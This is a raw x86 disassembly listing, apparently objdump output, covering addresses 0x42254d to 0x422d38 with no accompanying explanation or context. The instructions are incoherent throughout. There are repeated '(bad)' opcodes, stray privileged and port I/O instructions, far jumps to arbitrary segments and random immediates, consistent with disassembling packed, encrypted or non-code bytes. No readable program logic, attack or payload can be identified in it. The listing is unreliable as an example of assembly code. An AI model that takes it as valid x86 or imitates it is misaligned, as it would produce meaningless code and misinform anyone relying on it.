  42254d:	add    DWORD PTR [eax+eax*4-0x55],0xf27adb81
  422555:	not    ah
  422557:	or     DWORD PTR [edi-0x40],ebp
  42255a:	mov    al,0x6c
  42255c:	mov    DWORD PTR [eax+eax*4],esp
  42255f:	(bad)  
  422560:	lahf   
  422561:	in     eax,dx
  422562:	pop    edi
  422563:	js     0x4225e1
  422565:	jle    0x4225c2
  422567:	iret   
  422568:	not    BYTE PTR [ecx+0x10]
  42256b:	stc    
  42256c:	pop    ss
  42256d:	jl     0x42258a
  42256f:	dec    eax
  422570:	fwait
  422571:	mov    al,0x92
  422573:	pop    ebx
  422574:	sub    bh,ah
  422576:	adc    BYTE PTR fs:[edx],dl
  422579:	xchg   BYTE PTR [eax+0x37c32cff],ch
  42257f:	pop    eax
  422580:	add    BYTE PTR [esi],ah
  422582:	sub    dl,BYTE PTR [eax]
  422584:	dec    ebx
  422585:	or     al,0x58
  422587:	xor    BYTE PTR ds:0xa2616423,ch
  42258d:	inc    esp
  42258e:	jp     0x42254e
  422590:	or     esp,DWORD PTR [eax]
  422592:	mov    edx,0x5a524cba
  422597:	cmc    
  422598:	ins    DWORD PTR es:[edi],dx
  422599:	loopne 0x42255c
  42259b:	fstp   TBYTE PTR [esi-0x1afdd747]
  4225a1:	daa    
  4225a2:	mov    BYTE PTR [edi+0x5d00d220],al
  4225a8:	add    eax,DWORD PTR [eax+0x4b7b9501]
  4225ae:	dec    edi
  4225af:	cmp    esi,DWORD PTR [ebx-0x67]
  4225b2:	mov    edi,0x4feaf0cf
  4225b7:	sbb    al,0x64
  4225b9:	pushf  
  4225ba:	jg     0x4225da
  4225bc:	stos   DWORD PTR es:[edi],eax
  4225bd:	cmp    DWORD PTR [ebx+ebp*4+0x26fd5e18],ebx
  4225c4:	pop    ecx
  4225c5:	mov    esi,0x72a1c0f8
  4225ca:	fdivr  QWORD PTR [ebp+0x1e7e6b02]
  4225d0:	leave  
  4225d1:	call   0xa05f:0x5323f6e6
  4225d8:	mov    eax,0x7e3ee09
  4225dd:	fdivr  DWORD PTR [edi+0x65]
  4225e0:	aad    0x55
  4225e2:	pop    edx
  4225e3:	imul   edx,esi,0x4efc76e1
  4225e9:	pop    ds
  4225ea:	pusha  
  4225eb:	xor    DWORD PTR [esi],ebx
  4225ed:	cmp    eax,0x8c1388bc
  4225f2:	outs   dx,BYTE PTR ds:[esi]
  4225f3:	push   edi
  4225f4:	pusha  
  4225f5:	add    ebx,0xffffffa4
  4225f8:	xchg   DWORD PTR [ebp+0x276346e9],ecx
  4225fe:	shl    BYTE PTR [edx],1
  422600:	imul   esp,ebp,0x19042ef1
  422606:	push   esi
  422607:	jne    0x422619
  422609:	push   ss
  42260a:	inc    ebp
  42260b:	loopne 0x4225d1
  42260d:	or     DWORD PTR [ebp+edx*2+0x7adcbf57],ebx
  422614:	call   DWORD PTR [edx-0x55f86faa]
  42261a:	mov    eax,0x89855c9d
  42261f:	les    eax,FWORD PTR [ecx+edi*1]
  422622:	adc    eax,0x2c43c8f1
  422627:	inc    esi
  422628:	pop    edx
  422629:	add    BYTE PTR [ebp+0x69],cl
  42262c:	pop    edi
  42262d:	inc    esi
  42262e:	pop    ebx
  42262f:	cmp    al,0xbf
  422631:	popf   
  422632:	fist   WORD PTR ds:0x7bfd00ba
  422638:	sbb    bl,dl
  42263a:	js     0x422626
  42263c:	out    0x7e,eax
  42263e:	push   ecx
  42263f:	add    eax,0xa021f7b0
  422644:	dec    eax
  422645:	push   ss
  422646:	les    edi,FWORD PTR [edx+0x5b0ca656]
  42264c:	and    eax,0x564641c3
  422651:	mov    bl,0xb
  422653:	mov    esp,DWORD PTR [ebp+ebp*1+0x400035fb]
  42265a:	pusha  
  42265b:	push   cs
  42265c:	mov    al,0x93
  42265e:	loope  0x42261b
  422660:	test   al,0xba
  422662:	ja     0x4226cd
  422664:	jp     0x4226a1
  422666:	and    al,0xd7
  422668:	mov    dl,0x3d
  42266a:	(bad)  
  42266b:	ja     0x422696
  42266d:	stc    
  42266e:	mov    al,0xb4
  422670:	jae    0x4226e9
  422672:	int    0xe8
  422674:	ss push es
  422676:	arpl   WORD PTR [ebp+0x5233d74b],bp
  42267c:	pop    ebx
  42267d:	mov    esi,0xeaf88653
  422682:	repz arpl bx,dx
  422685:	sbb    eax,0x64e05481
  42268a:	push   esp
  42268b:	retf   
  42268c:	scas   al,BYTE PTR es:[edi]
  42268d:	cdq    
  42268e:	push   ebx
  42268f:	cld    
  422690:	aam    0xd1
  422692:	idiv   BYTE PTR [edx+0x21]
  422695:	mov    fs,ebp
  422697:	retf   0x7a75
  42269a:	mov    ds:0xb5200f93,al
  42269f:	adc    eax,0x3d2cc32b
  4226a4:	sbb    DWORD PTR [edi],esi
  4226a6:	jle    0x422641
  4226a8:	mov    edx,0x4c6c3acf
  4226ad:	lods   al,BYTE PTR ds:[esi]
  4226ae:	les    esi,FWORD PTR [ebx]
  4226b0:	jmp    0x7100855c
  4226b5:	lods   eax,DWORD PTR ds:[esi]
  4226b6:	pop    es
  4226b7:	adc    bl,ch
  4226b9:	loope  0x42263c
  4226bb:	or     DWORD PTR [eax+0x118e4e0a],0x8dfd31ce
  4226c5:	cmp    ecx,DWORD PTR [ebp-0x28757684]
  4226cb:	call   0x7424a1eb
  4226d0:	cld    
  4226d1:	in     al,dx
  4226d2:	jmp    0x4226e2
  4226d4:	test   DWORD PTR [ecx-0x4],ebx
  4226d7:	test   eax,0xee71960
  4226dc:	test   DWORD PTR [edi-0x796d047c],ebx
  4226e2:	dec    esp
  4226e3:	bound  eax,QWORD PTR [edx-0x6d81e381]
  4226e9:	jns    0x42271e
  4226eb:	jo     0x42268b
  4226ed:	mov    BYTE PTR [edx+0x23],cl
  4226f0:	push   0xa35f3fdf
  4226f5:	ins    BYTE PTR es:[edi],dx
  4226f6:	ja     0x4226f2
  4226f8:	ror    BYTE PTR [edx+edx*2],0x0
  4226fc:	fisub  DWORD PTR [ebx-0x22730488]
  422702:	fwait
  422703:	or     DWORD PTR [edi-0x7592c601],ecx
  422709:	xor    al,0x1e
  42270b:	push   eax
  42270c:	sti    
  42270d:	gs stc 
  42270f:	pop    ds
  422710:	aaa    
  422711:	pop    edi
  422712:	cmp    esi,DWORD PTR [eax]
  422714:	stos   DWORD PTR es:[edi],eax
  422715:	jl     0x42274f
  422717:	xchg   edx,eax
  422718:	adc    eax,0xf45424f2
  42271d:	in     al,dx
  42271e:	cmp    BYTE PTR [eax-0x77c53828],ch
  422724:	or     eax,0x339a5997
  422729:	sub    al,BYTE PTR [esp+edx*8+0x55]
  42272d:	mul    BYTE PTR [ebx]
  42272f:	mov    al,ds:0xe20d5b1d
  422734:	ins    DWORD PTR es:[edi],dx
  422735:	ret    0x2b09
  422738:	int3   
  422739:	adc    DWORD PTR [edi-0x17461080],edx
  42273f:	ficom  WORD PTR ds:0x6b28ffaa
  422745:	mov    ecx,0x5f90d986
  42274a:	mov    eax,0x6c40e522
  42274f:	daa    
  422750:	lahf   
  422751:	mov    ss,WORD PTR [ecx+0x624011ba]
  422757:	aaa    
  422758:	ds jbe 0x422765
  42275b:	jne    0x4227bb
  42275d:	jmp    0x422790
  42275f:	cdq    
  422760:	push   ecx
  422761:	shr    DWORD PTR [edx+0x463b5680],cl
  422767:	js     0x4227ae
  422769:	arpl   WORD PTR [ecx],bx
  42276b:	inc    ecx
  42276c:	pop    es
  42276d:	or     DWORD PTR [ecx+0x46],eax
  422770:	clc    
  422771:	hlt    
  422772:	cdq    
  422773:	dec    esi
  422774:	in     eax,0xc5
  422776:	mov    ebx,0x28ae9322
  42277b:	jmp    0x4227c2
  42277d:	xchg   edi,eax
  42277e:	xchg   esi,eax
  42277f:	mov    al,0xeb
  422781:	and    bh,BYTE PTR gs:[ebx]
  422784:	pop    esp
  422785:	inc    esi
  422786:	xor    ebp,edi
  422788:	dec    ebx
  422789:	jge    0x4227dd
  42278b:	fmulp  st(1),st
  42278d:	cmp    al,0x3
  42278f:	mov    fs,WORD PTR [eax]
  422791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422792:	outs   dx,BYTE PTR ds:[esi]
  422793:	bound  esp,QWORD PTR [edx]
  422795:	adc    BYTE PTR [ebx-0x40fe297d],dh
  42279b:	or     bh,BYTE PTR [edx+eiz*8]
  42279e:	mov    ebp,0x62308f34
  4227a3:	cli    
  4227a4:	lods   al,BYTE PTR ds:[esi]
  4227a5:	xor    al,0x93
  4227a7:	push   cs
  4227a8:	cmp    al,0x93
  4227aa:	dec    ebx
  4227ab:	ret    0x33da
  4227ae:	sbb    eax,0x6120a8f6
  4227b3:	sahf   
  4227b4:	into   
  4227b5:	test   eax,0x7c153cb9
  4227ba:	add    BYTE PTR [edi+0x51],dl
  4227bd:	outs   dx,BYTE PTR ds:[esi]
  4227be:	mov    ah,BYTE PTR [edi-0x88eb1df]
  4227c4:	pop    edx
  4227c5:	jg     0x42274c
  4227c7:	xchg   edx,eax
  4227c8:	push   esp
  4227c9:	(bad)  [edi+0x35]
  4227cc:	int    0xf6
  4227ce:	xchg   edx,eax
  4227cf:	pusha  
  4227d0:	pop    ecx
  4227d1:	mov    bh,0x4b
  4227d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d4:	into   
  4227d5:	xchg   edi,eax
  4227d6:	pop    es
  4227d7:	clc    
  4227d8:	iret   
  4227d9:	cdq    
  4227da:	or     al,0xd1
  4227dc:	repz adc al,0x67
  4227df:	rcr    BYTE PTR [ebx+0x7e],cl
  4227e2:	pop    esi
  4227e3:	xchg   edx,eax
  4227e4:	xchg   edi,eax
  4227e5:	dec    BYTE PTR [eax]
  4227e7:	cmp    cl,BYTE PTR [ebx]
  4227e9:	mov    ebp,0x278fa5ac
  4227ee:	or     eax,edi
  4227f0:	adc    eax,0x582f87c2
  4227f5:	xor    BYTE PTR [ecx+0x67],0x79
  4227f9:	mov    bl,0x38
  4227fb:	loopne 0x4227ce
  4227fd:	add    DWORD PTR [ecx],ecx
  4227ff:	js     0x422848
  422801:	and    bh,BYTE PTR [edi-0x540c4bb4]
  422807:	fadd   st,st(4)
  422809:	imul   ecx,ecx,0xfffffffa
  42280c:	adc    DWORD PTR [edi+0x67],0xffffffa3
  422810:	ins    DWORD PTR es:[edi],dx
  422811:	push   0x61
  422813:	call   0x65ab:0x43536259
  42281a:	mov    esi,0x28425de6
  42281f:	inc    eax
  422820:	fcom   st(6)
  422822:	xchg   edi,eax
  422823:	leave  
  422824:	jmp    0x422887
  422826:	idiv   ecx
  422828:	pop    edi
  422829:	adc    eax,DWORD PTR fs:[edx]
  42282c:	adc    cl,al
  42282e:	fs std 
  422830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422831:	mov    ecx,0xbbf1ab70
  422836:	loop   0x4227f9
  422838:	jg     0x4227c5
  42283a:	mov    DWORD PTR [eax],0xd840a0c1
  422840:	cli    
  422841:	out    0x4f,al
  422843:	test   eax,0xad66b4e0
  422848:	clc    
  422849:	cmp    ebx,edx
  42284b:	xor    BYTE PTR [eax-0x630c2904],ah
  422851:	in     al,dx
  422852:	xchg   DWORD PTR [edx],esp
  422854:	rcl    DWORD PTR [edi-0x13],cl
  422857:	or     al,0x73
  422859:	lahf   
  42285a:	scas   eax,DWORD PTR es:[edi]
  42285b:	cdq    
  42285c:	mov    edx,0x7f9e1011
  422861:	dec    esi
  422862:	adc    al,0x3
  422864:	adc    edx,DWORD PTR [edi]
  422866:	inc    eax
  422867:	adc    bh,ch
  422869:	bound  ecx,QWORD PTR [eax-0x4f5a178]
  42286f:	mov    eax,ds:0x4480d181
  422874:	into   
  422875:	xor    ebx,edx
  422877:	jg     0x4228a1
  422879:	lahf   
  42287a:	add    BYTE PTR [eax+esi*4-0x6658540],dh
  422881:	or     bh,dl
  422883:	mov    ebp,0x98cf4dfa
  422888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422889:	adc    al,BYTE PTR [esi]
  42288b:	mov    cl,0xc1
  42288d:	les    eax,FWORD PTR [edi]
  42288f:	ins    DWORD PTR es:[edi],dx
  422890:	add    BYTE PTR [ebx-0xdd0790a],bl
  422896:	repz or ebp,esi
  422899:	xchg   edx,eax
  42289a:	(bad)  
  42289b:	mov    cl,0x4d
  42289d:	ins    DWORD PTR es:[edi],dx
  42289e:	mov    ecx,0xebec8af6
  4228a3:	inc    eax
  4228a4:	mov    ah,0x2
  4228a6:	jmp    0xb13a:0x39f7eae8
  4228ad:	jbe    0x422929
  4228af:	push   edx
  4228b0:	cld    
  4228b1:	cli    
  4228b2:	pop    es
  4228b3:	stos   BYTE PTR es:[edi],al
  4228b4:	test   al,0x59
  4228b6:	jmp    0x42284f
  4228b8:	stc    
  4228b9:	retf   
  4228ba:	cli    
  4228bb:	fcomp  QWORD PTR [esi]
  4228bd:	fistp  WORD PTR [edi+ebx*8-0x5c6b88a6]
  4228c4:	mov    esi,0x609e47b9
  4228c9:	adc    al,0x16
  4228cb:	repz fucomip st,st(1)
  4228ce:	out    dx,eax
  4228cf:	ss mov ecx,0xd82d63a9
  4228d5:	add    ebp,DWORD PTR [eax]
  4228d7:	out    dx,eax
  4228d8:	jp     0x422866
  4228da:	xchg   DWORD PTR [ebx-0x7f],esi
  4228dd:	arpl   WORD PTR ds:0x35796cb3,sp
  4228e3:	bnd jp 0x42293d
  4228e6:	xchg   DWORD PTR [ebx],eax
  4228e8:	mov    ecx,0xa3097e5c
  4228ed:	xchg   esp,eax
  4228ee:	mov    ch,BYTE PTR [eax+eiz*1-0x73]
  4228f2:	repnz das 
  4228f4:	dec    edx
  4228f5:	push   ds
  4228f6:	push   ds
  4228f7:	add    eax,0x67d2f99b
  4228fc:	fild   QWORD PTR [edi-0x17933afc]
  422902:	aad    0xee
  422904:	push   ecx
  422905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422906:	adc    dh,BYTE PTR [edi+ebp*8-0x4965b823]
  42290d:	push   es
  42290e:	mov    al,0x2a
  422910:	push   edx
  422911:	pusha  
  422912:	mov    eax,0x7f9317b8
  422917:	add    BYTE PTR [ebp+0x459675cc],al
  42291d:	fwait
  42291e:	jg     0x422949
  422920:	ins    BYTE PTR es:[edi],dx
  422921:	loopne 0x422935
  422923:	mov    ds:0x8d92970b,al
  422928:	and    DWORD PTR [esi],ebx
  42292a:	div    BYTE PTR [eax-0x33ff99dc]
  422930:	outs   dx,DWORD PTR ds:[esi]
  422931:	fwait
  422932:	sub    ebx,DWORD PTR ds:0xc7d909bf
  422938:	mov    WORD PTR [ebp-0x45],es
  42293b:	xor    ebx,ecx
  42293d:	jmp    0xa389:0x2f7659f2
  422944:	xchg   edi,eax
  422945:	push   ds
  422946:	imul   eax,esi,0x5048cf25
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	into   
  422957:	push   ss
  422958:	dec    esi
  422959:	bound  ebx,QWORD PTR [eax]
  42295b:	mov    eax,0x6880001
  422960:	add    BYTE PTR [eax],al
  422962:	ins    DWORD PTR es:[edi],dx
  422963:	sbb    DWORD PTR [ebp+0x2d49e2c5],edx
  422969:	shr    BYTE PTR [eax-0xcc5d4ec],cl
  42296f:	push   0xffffffe6
  422971:	push   cs
  422972:	add    eax,0xcba30e8e
  422977:	or     cl,BYTE PTR [ebx+edx*8+0x57a6a3c4]
  42297e:	cld    
  42297f:	repnz pop edi
  422981:	xor    di,bx
  422984:	test   DWORD PTR [ebx+0x16],ebx
  422987:	or     eax,0xbedbb394
  42298c:	xchg   esp,eax
  42298d:	sbb    eax,DWORD PTR [ecx-0x3c]
  422990:	aaa    
  422991:	out    dx,al
  422992:	pop    eax
  422993:	push   esi
  422994:	lahf   
  422995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422996:	sub    DWORD PTR [esp+esi*4],eax
  422999:	jo     0x42297c
  42299b:	stc    
  42299c:	push   es
  42299d:	pop    ecx
  42299e:	into   
  42299f:	inc    ebp
  4229a0:	fs dec edx
  4229a2:	xchg   esp,eax
  4229a3:	imul   esp,eax,0xffffffc7
  4229a6:	lahf   
  4229a7:	loop   0x422a13
  4229a9:	push   0xc02b9f52
  4229ae:	scas   al,BYTE PTR es:[edi]
  4229af:	lock lds esi,FWORD PTR ds:0xe2e08e5b
  4229b6:	sbb    DWORD PTR [edi-0x456eaa02],esi
  4229bc:	and    esi,DWORD PTR [ebp+0x210d1f54]
  4229c2:	lds    esi,FWORD PTR [ebp+ebp*4-0x3c07d796]
  4229c9:	int3   
  4229ca:	outs   dx,DWORD PTR ds:[esi]
  4229cb:	imul   esi,DWORD PTR [ecx],0xffffffc5
  4229ce:	icebp  
  4229cf:	cld    
  4229d0:	test   BYTE PTR [ebp+0x5b34af1],ch
  4229d6:	int3   
  4229d7:	clc    
  4229d8:	jmp    0xd667f2dc
  4229dd:	dec    edx
  4229de:	lods   eax,DWORD PTR ds:[esi]
  4229df:	dec    edi
  4229e0:	mov    gs,WORD PTR [edx-0x31]
  4229e3:	sub    DWORD PTR [eax-0x4b],edx
  4229e6:	inc    ecx
  4229e7:	out    dx,al
  4229e8:	jo     0x422a42
  4229ea:	adc    al,0x14
  4229ed:	push   esp
  4229ee:	mov    dl,0xcc
  4229f0:	pop    DWORD PTR [eax-0x6a]
  4229f3:	mov    ch,0xd2
  4229f5:	loope  0x422a6c
  4229f7:	dec    ebx
  4229f8:	bnd jns 0x4229be
  4229fb:	push   ss
  4229fc:	inc    ebp
  4229fd:	fistp  QWORD PTR [ebx-0x71bd7910]
  422a03:	loopne 0x422987
  422a05:	call   0x965168e7
  422a0a:	(bad)  
  422a0b:	sub    BYTE PTR [ebx+0x7b43db9d],bl
  422a11:	add    DWORD PTR [edx+0x623ec544],esp
  422a17:	push   ecx
  422a18:	mov    bl,0x3f
  422a1a:	ins    BYTE PTR es:[edi],dx
  422a1b:	stc    
  422a1c:	mov    edx,DWORD PTR [ebx+0x27]
  422a1f:	jne    0x4229bf
  422a21:	dec    ebp
  422a22:	(bad)  [eax*2-0x2dda4019]
  422a29:	xor    eax,0x3a5c20e9
  422a2e:	xor    eax,0xe74f925e
  422a33:	inc    edi
  422a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a35:	lods   al,BYTE PTR ds:[esi]
  422a36:	sub    dh,ch
  422a38:	out    dx,al
  422a39:	jecxz  0x4229da
  422a3b:	jb     0x4229c1
  422a3d:	push   ebx
  422a3e:	into   
  422a3f:	sahf   
  422a40:	adc    al,0xe1
  422a42:	fs mov esp,0xbec5a733
  422a48:	inc    ebp
  422a49:	inc    ecx
  422a4a:	adc    BYTE PTR [eax],dl
  422a4c:	dec    edx
  422a4d:	fmul   st,st(6)
  422a50:	leave  
  422a51:	fist   DWORD PTR [eax-0x39a6d094]
  422a57:	repz push 0xc3a419a1
  422a5d:	push   esi
  422a5e:	enter  0xbdc4,0x44
  422a62:	jbe    0x422a17
  422a64:	pop    ebp
  422a65:	aas    
  422a66:	sti    
  422a67:	mov    esp,0x7c0f256c
  422a6c:	inc    edx
  422a6d:	lds    esi,FWORD PTR [esp+ebp*1+0x6a]
  422a71:	cld    
  422a72:	ret    
  422a73:	lea    esi,[ebp+0xeed9fd]
  422a79:	lods   al,BYTE PTR ds:[esi]
  422a7a:	mov    edx,0xeb243477
  422a7f:	push   edx
  422a80:	mov    esi,0x45e9001c
  422a85:	imul   ebx,DWORD PTR [ebp+0x3899611b],0x22045aab
  422a8f:	setg   BYTE PTR [eax]
  422a92:	mov    WORD PTR [edx-0x7e],fs
  422a95:	shr    BYTE PTR [esi],0x58
  422a98:	xor    al,0xde
  422a9a:	repnz mov ds:0xad0011f,al
  422aa0:	test   DWORD PTR [edx-0x58],0x428ccc28
  422aa7:	xchg   edx,eax
  422aa8:	aam    0x6
  422aaa:	mov    esi,esp
  422aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aad:	sbb    eax,esp
  422aaf:	xor    eax,0xf572d9d0
  422ab4:	scas   eax,DWORD PTR es:[edi]
  422ab5:	rcl    BYTE PTR [esp+edx*2-0x5de2be77],cl
  422abc:	mov    esp,0xc0234e98
  422ac1:	retf   
  422ac2:	xor    ebp,DWORD PTR [esi-0x2d98fcca]
  422ac8:	sub    DWORD PTR [eax+0x4e],esi
  422acb:	cmp    eax,0x9cfc70e1
  422ad0:	xor    BYTE PTR [edx-0x1e],ah
  422ad3:	rcl    BYTE PTR [edi],0x37
  422ad6:	pop    edx
  422ad7:	jmp    0x422a8e
  422ad9:	push   ebp
  422ada:	lds    edx,FWORD PTR [edx-0x600f9de9]
  422ae0:	mov    ds:0x6a90baed,eax
  422ae5:	outs   dx,BYTE PTR ds:[esi]
  422ae6:	(bad)  
  422ae7:	nop
  422ae8:	adc    al,0xcc
  422aea:	and    esp,DWORD PTR [ebp+0x2243da66]
  422af0:	pop    ecx
  422af1:	or     BYTE PTR [ebx-0x9],bl
  422af4:	rol    BYTE PTR [edi],1
  422af6:	ficom  DWORD PTR [eax+0x13]
  422af9:	inc    edi
  422afa:	jb     0x422b6a
  422afc:	mul    esi
  422afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aff:	hlt    
  422b00:	icebp  
  422b01:	push   ds
  422b02:	daa    
  422b03:	ja     0x422aa4
  422b05:	pushf  
  422b06:	xchg   esi,eax
  422b07:	(bad)  
  422b08:	push   ds
  422b09:	cdq    
  422b0a:	push   ebp
  422b0b:	push   ebx
  422b0c:	adc    DWORD PTR [esi],eax
  422b0e:	and    DWORD PTR [edi-0x3],ecx
  422b11:	test   al,0x19
  422b13:	pop    ecx
  422b14:	test   BYTE PTR [ebx-0xb55ab1b],al
  422b1a:	xor    BYTE PTR [esi],dl
  422b1c:	inc    edx
  422b1d:	mov    DWORD PTR [eax],esi
  422b1f:	cwde   
  422b20:	(bad)  
  422b21:	aam    0x65
  422b23:	pushf  
  422b24:	push   esp
  422b25:	or     bh,BYTE PTR [esi-0x5e2b2877]
  422b2b:	inc    ebx
  422b2c:	mov    ah,0x5
  422b2e:	mov    ch,0x2
  422b30:	dec    ebx
  422b31:	push   ebp
  422b32:	jmp    DWORD PTR [edx+0x916ba37]
  422b38:	fsubr  st,st(0)
  422b3a:	das    
  422b3b:	pop    eax
  422b3c:	mov    ebx,0x189bf342
  422b41:	push   edi
  422b42:	jmp    0x2155e7b6
  422b47:	xor    ebx,ebx
  422b49:	shl    BYTE PTR [esi+0x1e],1
  422b4c:	and    DWORD PTR [ecx],ecx
  422b4e:	outs   dx,DWORD PTR ds:[esi]
  422b4f:	mov    ch,0x85
  422b51:	dec    edi
  422b52:	int3   
  422b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b54:	xor    eax,0xb587751f
  422b59:	mov    ds:0xf88c5af1,al
  422b5e:	xor    ecx,DWORD PTR [edx+0x7ced230]
  422b64:	cwde   
  422b65:	ja     0x422b7b
  422b67:	push   esp
  422b68:	xor    esp,DWORD PTR [edi]
  422b6a:	les    ebx,FWORD PTR [eax+0x6f3b2f80]
  422b70:	pop    eax
  422b71:	or     edx,esi
  422b73:	jo     0x422b7d
  422b75:	mov    ebx,0xfee50fd8
  422b7a:	fucomip st,st(1)
  422b7c:	in     eax,0x3f
  422b7e:	ss xchg ebx,eax
  422b80:	inc    esp
  422b81:	icebp  
  422b82:	mov    ah,0x9c
  422b84:	xor    eax,esi
  422b86:	mov    bh,0xb8
  422b88:	mov    esi,0x7f109347
  422b8d:	mov    esi,0x7307813b
  422b92:	(bad)  
  422b93:	push   ebx
  422b94:	add    al,0xf2
  422b96:	ds dec edx
  422b98:	mov    ds:0x872b595d,al
  422b9d:	int    0xf3
  422b9f:	popa   
  422ba0:	dec    edx
  422ba1:	pop    ds
  422ba2:	test   eax,0xce04bbf6
  422ba7:	(bad)  
  422ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422baa:	retf   0xa0af
  422bad:	inc    ebx
  422bae:	fnstsw WORD PTR [ebx-0x2eb6602c]
  422bb4:	mov    esp,0xfd8469c8
  422bb9:	cwde   
  422bba:	rcl    ebp,0xf8
  422bbd:	push   edi
  422bbe:	pop    ds
  422bbf:	xor    al,0xbb
  422bc1:	and    al,0xac
  422bc3:	call   0xca98:0x1a3af1bd
  422bca:	pop    es
  422bcb:	cmp    al,0xdc
  422bcd:	push   ss
  422bce:	jne    0x422c4b
  422bd0:	xor    al,0x38
  422bd2:	or     dl,bh
  422bd4:	add    al,0xef
  422bd6:	retf   0x788e
  422bd9:	loope  0x422c0d
  422bdb:	adc    al,0x38
  422bdd:	add    dl,BYTE PTR [ebx]
  422bdf:	jl     0x422c1c
  422be1:	mov    esi,0x62f901ac
  422be6:	mov    esi,0x5497ff82
  422beb:	pop    es
  422bec:	mov    eax,ds:0xa63be79c
  422bf1:	aad    0x5a
  422bf3:	push   ecx
  422bf4:	cld    
  422bf5:	mov    ds:0x1eeb37,eax
  422bfa:	js     0x422bda
  422bfc:	inc    ebp
  422bfd:	mov    bh,0xa8
  422bff:	add    eax,0xaed46dd0
  422c04:	xor    dl,ah
  422c06:	or     al,0x3c
  422c08:	outs   dx,DWORD PTR ds:[esi]
  422c09:	icebp  
  422c0a:	sbb    DWORD PTR [edx],esi
  422c0c:	imul   esp,DWORD PTR [ebx],0xffffffc9
  422c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c10:	mov    al,0x77
  422c12:	lds    ebx,FWORD PTR [ecx+ebx*4+0x64]
  422c16:	add    edi,0xffffffad
  422c19:	jmp    0x422c4a
  422c1b:	mov    bh,0xa5
  422c1d:	jnp    0x422c97
  422c1f:	sbb    eax,0x3bebb554
  422c24:	push   edx
  422c25:	inc    esi
  422c26:	mov    cl,0xef
  422c28:	call   0xc64d:0x5d751c01
  422c2f:	fcmovnu st,st(4)
  422c31:	pop    es
  422c32:	hlt    
  422c33:	retf   0xd748
  422c36:	clc    
  422c37:	jmp    0x422be2
  422c39:	sub    edx,DWORD PTR ds:0x6918d7a6
  422c3f:	jl     0x422c41
  422c41:	mov    eax,0xb851be09
  422c46:	push   ss
  422c47:	jecxz  0x422c53
  422c49:	fucomp st(2)
  422c4b:	cmc    
  422c4c:	sub    DWORD PTR [esp+eax*2-0x25],eax
  422c50:	adc    DWORD PTR [esi-0x23e181b9],ecx
  422c56:	stos   BYTE PTR es:[edi],al
  422c57:	cmp    al,0x81
  422c59:	xchg   DWORD PTR [ebp-0x68],edi
  422c5c:	mov    ds:0x622cab07,al
  422c61:	dec    ebp
  422c62:	lea    ebx,[ebx]
  422c64:	push   cs
  422c65:	fs jno 0x422c8f
  422c68:	xor    al,0xde
  422c6a:	retf   
  422c6b:	and    DWORD PTR [eax+0x6e],0xd25fa6ae
  422c72:	sar    BYTE PTR [ebp+0x63f2f62d],cl
  422c78:	mov    dh,0xc3
  422c7a:	pop    ss
  422c7b:	stos   DWORD PTR es:[edi],eax
  422c7c:	(bad)  
  422c7f:	adc    eax,0xae3ff45c
  422c84:	or     BYTE PTR [edi-0x481df382],0xf1
  422c8b:	test   DWORD PTR [edi],0xfa8f009d
  422c91:	mov    ecx,0xf285c89e
  422c96:	sub    DWORD PTR [ecx+0x54e95788],0x4c7e3308
  422ca0:	popa   
  422ca1:	xchg   esp,eax
  422ca2:	jns    0x422cf9
  422ca4:	and    cl,BYTE PTR [esi-0x7805282a]
  422caa:	outs   dx,DWORD PTR ds:[esi]
  422cab:	and    ebp,DWORD PTR [edi]
  422cad:	mov    esp,0x925798b6
  422cb2:	xor    DWORD PTR [edi-0x72],ebx
  422cb5:	pop    eax
  422cb6:	fwait
  422cb7:	or     DWORD PTR [eax-0x625f79d5],0xfffffff9
  422cbe:	pop    es
  422cbf:	fnstsw WORD PTR [edi]
  422cc1:	mov    es,WORD PTR [edx]
  422cc3:	mov    dl,0x38
  422cc5:	fcomp  QWORD PTR [esi+0xff2e380]
  422ccb:	pop    ds
  422ccc:	test   edx,esi
  422cce:	sbb    al,BYTE PTR [esp+eax*2-0x670135eb]
  422cd5:	pushf  
  422cd6:	sbb    ebx,0xca95f13b
  422cdc:	adc    eax,0xd89ee35f
  422ce1:	mov    bl,0xdd
  422ce3:	hlt    
  422ce4:	dec    ebx
  422ce5:	sbb    bh,bh
  422ce7:	scas   al,BYTE PTR es:[edi]
  422ce8:	aad    0x96
  422cea:	jb     0x422c8c
  422cec:	in     eax,0x13
  422cee:	rcl    DWORD PTR [ebp-0x67],0x8c
  422cf2:	xor    eax,0x5567a558
  422cf7:	jnp    0x422d6d
  422cf9:	mov    ah,0x20
  422cfb:	jb     0x422d50
  422cfd:	inc    esp
  422cfe:	adc    eax,0x4ca1eff5
  422d03:	in     al,0xa0
  422d05:	outs   dx,BYTE PTR ds:[esi]
  422d06:	or     edi,esi
  422d08:	jb     0x422d86
  422d0a:	pushf  
  422d0b:	sub    BYTE PTR [edx-0x31e37727],al
  422d11:	mov    bh,0x46
  422d13:	scas   al,BYTE PTR es:[edi]
  422d14:	inc    ecx
  422d15:	sub    esi,DWORD PTR [eax-0x8]
  422d18:	jecxz  0x422d15
  422d1a:	ror    DWORD PTR [esi+eax*8],1
  422d1d:	inc    edx
  422d1e:	scas   al,BYTE PTR es:[edi]
  422d1f:	mov    dh,0x2d
  422d21:	out    dx,al
  422d22:	or     BYTE PTR [edi+0xd],0xd2
  422d26:	shl    BYTE PTR [edx-0x17],1
  422d29:	sti    
  422d2a:	mov    ch,0xe
  422d2c:	rcl    DWORD PTR [esi-0x7469d440],1
  422d32:	fdivr  DWORD PTR [ebx-0xa60ac92]
  422d38:	push   esi
